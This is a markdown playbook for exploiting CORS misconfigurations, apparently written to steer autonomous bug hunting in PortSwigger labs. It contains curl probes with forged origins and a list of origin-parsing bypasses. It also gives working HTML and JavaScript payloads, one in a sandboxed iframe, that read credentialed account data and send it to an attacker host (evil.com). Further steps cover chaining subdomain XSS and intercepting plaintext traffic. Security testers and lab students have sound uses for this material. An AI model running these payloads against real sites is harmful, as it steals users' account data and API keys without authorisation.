# CORS Misconfiguration Methodology
## Expert-Level Playbook for Autonomous Bug Hunting

> CORS becomes a vulnerability when `Access-Control-Allow-Origin` is reflected
> or over-permissive **and** `Access-Control-Allow-Credentials: true`.

---

## Phase 1: Detection & Fingerprinting

### 1.1 Probe the ACAO Header
```bash
# Reflected origin?
curl -sk https://target/api/account -H "Origin: https://evil.com" -D- | grep -i access-control

# Look for:
Access-Control-Allow-Origin: https://evil.com     <-- reflected (dangerous)
Access-Control-Allow-Credentials: true            <-- + creds = jackpot
```

### 1.2 Test Origin Parsing Weaknesses
```
Origin: https://target.com.evil.com      -> suffix match bug
Origin: https://eviltarget.com           -> prefix match bug
Origin: https://sub.target.com           -> subdomain trust (find XSS there)
Origin: null                             -> "null" origin allow-listed
Origin: http://target.com                -> http scheme trusted (MITM)
```

---

## Phase 2: Exploitation Techniques

### 2.1 Reflected Origin + Credentials
```html
<script>
fetch('https://target/api/account', {credentials:'include'})
  .then(r=>r.text())
  .then(d=>fetch('https://evil.com/log?d='+encodeURIComponent(d)));
</script>
```

### 2.2 Null Origin Trust
- A sandboxed iframe sends `Origin: null`:
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms"
  srcdoc="<script>
    fetch('https://target/api/account',{credentials:'include'})
      .then(r=>r.text()).then(d=>location='https://evil.com/?'+btoa(d));
  </script>"></iframe>
```

### 2.3 Trusted Subdomain / Insecure Protocol
- Chain an XSS on an allow-listed subdomain to issue the cross-origin fetch.
- If `http://` origins are trusted, MITM an internal user's plaintext request.

---

## Phase 3: PortSwigger Lab-Specific Techniques
- **Basic origin reflection**: steal `apikey` from `/accountDetails`.
- **Trusted null origin**: sandboxed iframe with `srcdoc`.
- **Trusted insecure protocols**: XSS on an http subdomain to reach the API.
- Exfil target is usually the API key shown on the account page.

---

## Phase 4: Tools & Automation
```bash
# Quick reflection check across origin variants
for o in https://evil.com null https://target.com.evil.com; do
  echo "== $o =="; curl -sk https://target/api -H "Origin: $o" -D- -o /dev/null | grep -i access-control
done
```
- Host the exploit on the exploit server; deliver to the victim; read the log.

---

## Common Failure Modes & Solutions
| Problem | Solution |
|---------|----------|
| ACAO is a fixed domain | Try subdomain XSS or null origin |
| ACAC not true | No credential theft; look for unauthenticated data |
| Preflight blocks request | Use a "simple request" (GET, no custom headers) |

## Success Criteria
- [ ] Exfiltrated credentialed data cross-origin (e.g. API key)
- [ ] Delivered PoC via exploit server
- [ ] Lab shows "solved"
